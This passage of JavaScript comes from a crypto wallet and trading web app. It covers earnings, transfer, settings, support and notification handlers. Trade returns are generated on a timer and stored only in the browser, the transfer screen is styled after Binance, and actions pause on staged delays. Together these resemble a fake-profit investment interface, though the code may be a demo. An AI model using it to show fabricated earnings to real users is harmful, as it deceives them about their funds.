  state.totalEarnings = state.trades.reduce((a,t)=>a+t.earnings,0);
  setTradeState(state);
  renderTradePage();
}
setInterval(startTradeReturnsGenerator, 60000);

// ------ Earnings Page ------
function renderEarningsPage() {
  let state = getTradeState();
  $('#tradePanel').innerHTML = `
    <div class="tv-earnings">
      <div class="font-bold text-lg mb-2">Total Earnings: <span>${fmtUsd(state.totalEarnings)}</span></div>
      <div id="tvEarningsChart" style="height:350px;"></div>
      <button id="tvTransferBtnEarnings" class="px-4 py-2 bg-yellow-500 text-black font-bold rounded mt-3">Transfer</button>
    </div>
  `;
  embedTradeChart(state.lastSymbol || "BINANCE:BTCUSDT");
  $('#tvTransferBtnEarnings').onclick = () => renderTransferPage();
}

// ------ Transfer Page (Binance app style) ------
function renderTransferPage() {
  $('#tradePanel').innerHTML = `
    <div class="tv-transfer p-4">
      <label>Enter amount:</label>
      <input id="transferAmountInput" class="input-black-text border border-gray-800 px-3 py-2 rounded text-sm mb-2" type="number" />
      <div class="mt-2 mb-2">
        <button id="switchTransferBtn" class="px-3 py-2 bg-gray-800 rounded">Switch</button>
        <span id="transferToLabel" class="ml-2">Transfer to Main Wallet</span>
      </div>
      <button id="transferConfirmBtn" class="px-4 py-2 bg-yellow-500 text-black font-bold rounded mt-2">Transfer</button>
      <div id="transferMsg" class="mt-3"></div>
    </div>
  `;
  let transferTo = "main";
  $('#switchTransferBtn').onclick = function() {
    if(transferTo === "main") {
      transferTo = "trade";
      $('#transferToLabel').innerText = "Transfer to Trade Account";
    } else {
      transferTo = "main";
      $('#transferToLabel').innerText = "Transfer to Main Wallet";
    }
  };
  $('#transferConfirmBtn').onclick = async function() {
    let amt = parseFloat($('#transferAmountInput').value);
    if(isNaN(amt) || amt <= 0) { $('#transferMsg').innerText = "Enter valid amount."; return; }
    $('#transferMsg').innerText = "Processing...";
    await sleep(15000);

    let state = getTradeState();
    let main = getMainPortfolio();

    if(transferTo === "main") {
      // Trade -> Main Wallet Portfolio
      if(amt > state.totalBalance) { $('#transferMsg').innerText = "Insufficient trade balance"; return; }
      state.totalBalance -= amt;
      main.totalPortfolio += amt;
      setMainPortfolio(main);
      $('#transferMsg').innerText = "Transferred to Main Wallet!";
    } else {
      // Main Wallet Portfolio -> Trade
      if(amt > main.totalPortfolio) { $('#transferMsg').innerText = "Insufficient main wallet balance"; return; }
      state.totalBalance += amt;
      main.totalPortfolio -= amt;
      setMainPortfolio(main);
      $('#transferMsg').innerText = "Transferred to Trade Account!";
    }
    setTradeState(state);
    renderTradePage();
  };
}

// ------ On Load: Restore persistent state ------
window.addEventListener('DOMContentLoaded', function() {
  renderTradePage();
  // Restore last modal/page if needed (future: check lastPage/lastActivity for SPA persistence)
});

// ========== SETTINGS ==========
$('#settingsBtn').onclick = function() { switchPage('settingsPage'); };
$('#closeAccountBtn').onclick = async function() {
  if (!app.twofaStatus[app.user.accountId]) { alert("Enable 2FA first."); return; }
  alert("Deactivating..."); await sleep(15000);
  let map = getLS(LS.walletMap,{}); delete map[app.user.address];
  saveLS(LS.walletMap, map);
  delLS(LS.user); app.user=null;
  switchPage('landingPage');
};
// Theme
$('#themeSelect').onchange = function() {
  app.theme = this.value; saveLS(LS.theme, app.theme);
  document.body.className = app.theme==="light"?"bg-white text-black":"bg-black text-white";
};

// ========== SUPPORT ==========
$('#supportBtn').onclick = function() { switchPage('supportPage'); };
$('#supportSendBtn').onclick = function() {
  let msg = $('#supportUserMsg').value.trim();
  if (!msg) return;
  let box = $('#supportChatBox');
  box.innerHTML += `<div class="mb-2"><b>You:</b> ${msg}</div>`;
  $('#supportUserMsg').value = "";
  setTimeout(()=>{box.innerHTML += `<div class="mb-2 text-yellow-400"><b>Bot:</b> Thank you for your message. Our AI assistant will reply soon. For now, check FAQs above.</div>`;box.scrollTop=box.scrollHeight;},1000);
};

// ========== NOTIFICATIONS ==========
$('#notifBtn').onclick = function() { switchPage('notifPage'); };
$('#notifToggle').onchange = function() {
  app.notif.enabled = this.checked; saveLS(LS.notif, app.notif);
  $('#notifToggleLabel').innerText = this.checked?"On":"Off";
};
$('#notifPageToggle').onchange = function() {
  app.notif.enabled = this.checked; saveLS(LS.notif, app.notif);
  $('#notifPageToggleLabel').innerText = this.checked?"On":"Off";
};
$('#notifList').innerText = app.notifMsgs.slice(-10).map(msg=>"<div>"+msg+"</div>").join("");

// ========== TRANSACTIONS / ACTIVITY ==========
$('#transactionsBtn').onclick = function() {
  switchPage('home');
  renderOngoingWithdrawals();
  alert("Show transactions. List: "+JSON.stringify(app.transactions));
};
$('#activityBtn').onclick = function() {
  switchPage('home');
  renderOngoingWithdrawals();
  alert("Show activity. List: "+JSON.stringify(app.transactions));
};
$('#disconnectBtn').onclick = async function() {
  alert("Disconnecting...");
  await sleep(15000);
  delLS(LS.user); app.user=null; switchPage('landingPage');
};
// END
